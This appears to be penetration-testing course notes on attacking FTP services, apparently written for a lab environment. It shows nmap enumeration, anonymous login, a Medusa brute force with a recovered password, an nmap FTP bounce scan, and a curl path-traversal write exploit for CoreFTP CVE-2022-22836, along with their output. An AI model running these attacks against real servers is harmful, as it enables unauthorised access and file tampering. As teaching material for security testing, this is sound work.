# Attacking FTP

## Enumeration

Nmap default scripts ```-sC``` includes the ftp-anon Nmap script which checks if a FTP server allows anonymous logins. The version enumeration flag ```-sV``` provides interesting information about FTP services, such as the FTP banner, which often includes the version name. You can use the ```ftp``` client or ```nc``` to interact with the FTP service. By default, FTP runs on TCP port 21.

```bash
d41y@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
Nmap scan report for 192.168.2.142
Host is up (0.00054s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner
| d--x--x--x   2 root     root         1024 Jan 14  2002 bin
| d--x--x--x   2 root     root         1024 Aug 10  1999 etc
| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root     root         1024 Jan 14  2002 lib
| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
```

## Misconfigurations

Anonymous authentication can be configured for different services such as FTP. To access with anonymous login, you can use the ```anonymous``` username and no password. This will be dangerous for the company if read and write permissions have not been set up correctly for the FTP service. Because with the anonymous login, the company could have stored sensitive information in a folder that the anonymous user of the FTP service should have access to.

This would enable you to download this sensitive information or even upload dangerous scripts. Using other vulns, such as path traversal in a web app, you would be able to find out where this file is located and execute it as PHP code, for example.

```bash
d41y@htb[/htb]$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
226 Directory send OK.
```

Once you get access to an FTP server with anonymous credentials, you can start searching for interesting information. You can use the commands ```ls``` and ```cd``` to move around directories like in Linux. To download a single file, you use ```get```, and to download multiple files, you can use ```mget```. For upload operations, you can use ```put``` for a simple file or ```mput``` for multiple files. You can use ```help``` in the FTP client session for more information.

## Protocol Specific Attacks

### Brute Forcing

If there is no anonymous authentication available, you can also brute-force the login for the FTP services using a list of the pre-generated usernames and passwords. There are many different tools to perform a brute-forcing attack. With Medusa, you can use the option ```-u``` to specify a single user to target, or you can use the option ```-U``` to provide a file with a list of usernames. The option ```-P``` is for a file containing a list of passwords. You can use the option ```-M``` and the protocol you are targeting and the option ```-h``` for the target hostname or IP address.

```bash
/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                             
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
```

### Bounce Attack

An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server.

Consider you are targeting an FTP server FTP_DMZ exposed to the internet. Another device within the same network, Internal_DMZ, is not exposed to the internet. You can use the connection to the FTP_DMZ server to scan Internal_DMZ using the FTP bounce attack and obtain information about the server's open ports. Then, you can use that information as part of your attack against the infrastructure.

![ftp attacks 1](../../../images/ftp_attacks1.png)

The Nmap ```-b``` flag can be used to perform an FTP bounce attack.

```bash
d41y@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

Modern FTP servers include protections that, by default, prevent this type of attack, but if these features are misconfigured in modern-day FTP servers, the server can become vulnerable to an FTP bounce attack.

## Latest Vulnerabilities

### CVE-2022-22836

This vulnerability, the CoreFTP before build 727 vulnerability, is for an FTP service that does not correctly process the HTTP PUT request and leads to an authenticated directory/path traversal, and arbitrary file write vulnerability. This vuln allows you to write files outside the directory to which the service has access to.

#### Concept of the Attack

This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which you can use to write content to files. The exploit for this attack is relatively straighforward, based on a singel ```curl``` command.

```bash
d41y@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

In short, the actual process misinterprets the user's input of the path. This leads to access to the restricted folder being bypassed. As a result, the write permissions on the HTTP PUT request are not adequately controlled, which leads to you being able to create the files you want outside of the authorized folders.

After the task has been completed, you will be able to find this file with the corresponding contents on the target system.

```
C:\> type C:\whoops

PoC.
```